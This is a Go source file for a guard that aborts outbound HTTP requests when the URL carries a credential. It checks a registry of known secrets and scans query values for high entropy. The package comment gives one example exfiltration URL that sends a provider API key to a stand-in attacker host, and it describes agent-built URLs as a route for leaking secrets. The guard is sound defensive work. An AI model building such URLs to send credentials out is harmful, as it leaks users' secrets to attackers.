// Package urlguard guards outbound HTTP requests against a side-channel
// credential-exfiltration vector: a model- or tool-constructed URL that smuggles
// a real secret out of the process inside its query string, e.g.
// "https://attacker.example/log?token=<provider api key>".
//
// The check runs on the raw target URL before a request is dialed. It leans on
// two complementary detectors:
//
//  1. The process-wide known-value registry (pkg/secrets). It holds the exact
//     credential strings this process loaded (provider keys, OAuth tokens, MCP
//     headers), so it erases — here, detects — the secrets we already know we
//     own. This is high-precision and zero false positives.
//  2. A conservative Shannon-entropy scan of the query parameter *values*. It
//     catches high-entropy blobs the registry was never told about (a secret the
//     agent copied out of a file mid-session). The thresholds are deliberately
//     strict so ordinary query strings ("?q=hello world", "?page=2") pass.
//
// It is a hard gate: on a hit the caller must abort the request rather than
// dispatch it, because the whole point of the vector is that the secret rides the
// request to an attacker-controlled host.
package urlguard

import (
	"fmt"
	"math"
	"net/url"

	"github.com/hackafterdark/phosphor/pkg/secrets"
)

// ErrMessage is the caller-facing abort message. It intentionally names the
// defense (not the specific secret) so a blocked request never echoes the
// credential back into the conversation transcript.
const ErrMessage = "refusing outbound request: sensitive credential detected in destination URL"

// High-entropy detector tuning. minTokenLen floors how short a query value can
// be and still be treated as a credential blob; a genuine token is long. minEntropy
// is the Shannon bits-per-character floor a value must clear, and the value must
// also span enough distinct characters to look random rather than like a padded
// dictionary word. These are calibrated so "?page=2&sort=name" never trips while
// "?token=aXk7...base64..." does.
const (
	minTokenLen      = 20
	minEntropy       = 3.6
	minDistinctChars = 12
)

// highEntropyEnabled gates the entropy pass. The known-value registry check always
// runs; this flag only controls the speculative high-entropy scan, so an operator
// seeing a false block on a legitimate signed URL can dial it back without losing
// the registry backstop.
var highEntropyEnabled = true

// SetHighEntropyDetection turns the speculative entropy pass on or off. The
// known-value registry check is unconditional and unaffected by this flag.
func SetHighEntropyDetection(on bool) { highEntropyEnabled = on }

// HighEntropyDetection reports whether the entropy pass is enabled.
func HighEntropyDetection() bool { return highEntropyEnabled }

// Check inspects the raw target URL and returns ErrMessage when a known secret or
// a high-entropy credential token is present in the URL query string. A nil error
// means the URL is safe to dial. An unparseable URL returns nil: parsing is not
// this guard's job, and callers already validate URLs on their own path.
func Check(rawURL string) error {
	if rawURL == "" {
		return nil
	}

	// Registry pass over the whole URL. The registry only ever removes exact
	// values we registered this session, so a scrub that changes the string is a
	// certain known-secret match — no false positives. Running it over the full
	// URL (not just the query) also catches a credential embedded in a path.
	if secrets.Scrub(rawURL) != rawURL {
		return fmt.Errorf("%s", ErrMessage)
	}

	parsed, err := url.Parse(rawURL)
	if err != nil {
		return nil
	}

	// Registry pass over the *decoded* query values. The registry stores the raw
	// value and one canonical percent-encoded form, but a query may smuggle the
	// same secret in a different valid encoding (e.g. lower-case escapes), which
	// the raw scan above cannot match. Parsing decodes it back to the exact
	// registered value. This is the high-precision pass and stays on even when
	// the speculative entropy scan is dialed back.
	for _, values := range parsed.Query() {
		for _, v := range values {
			if secrets.Scrub(v) != v {
				return fmt.Errorf("%s", ErrMessage)
			}
		}
	}

	if !highEntropyEnabled {
		return nil
	}

	// Values are the decoded query parameters; we scan the values only, never the
	// keys, so a long literal passed as ?q=<text> is still allowed while a random
	// blob in ?token= is caught.
	for _, values := range parsed.Query() {
		for _, v := range values {
			if looksLikeCredential(v) {
				return fmt.Errorf("%s", ErrMessage)
			}
		}
	}
	return nil
}

// looksLikeCredential reports whether a decoded query value has the statistical
// shape of a credential: long, high-entropy, and drawn from a wide character set.
func looksLikeCredential(v string) bool {
	if len(v) < minTokenLen {
		return false
	}
	distinct := entropy(v)
	if distinct == 0 {
		return false
	}
	return distinct >= minEntropy && countDistinct(v) >= minDistinctChars
}

// entropy returns the Shannon entropy in bits per character of s, used as the
// randomness signal. It is O(len(s)) with a fixed 256-entry histogram.
func entropy(s string) float64 {
	if s == "" {
		return 0
	}
	var counts [256]int
	for i := 0; i < len(s); i++ {
		counts[s[i]]++
	}
	n := float64(len(s))
	var h float64
	for _, c := range counts {
		if c == 0 {
			continue
		}
		p := float64(c) / n
		h -= p * math.Log2(p)
	}
	return h
}

// countDistinct returns the number of distinct bytes in s.
func countDistinct(s string) int {
	var seen [256]bool
	var n int
	for i := 0; i < len(s); i++ {
		if !seen[s[i]] {
			seen[s[i]] = true
			n++
		}
	}
	return n
}

// ScrubURL redacts every registered known-secret from rawURL so a URL can be
// shown to the model or logged without leaking a credential it carries.
func ScrubURL(rawURL string) string {
	if rawURL == "" {
		return rawURL
	}
	return secrets.Scrub(rawURL)
}
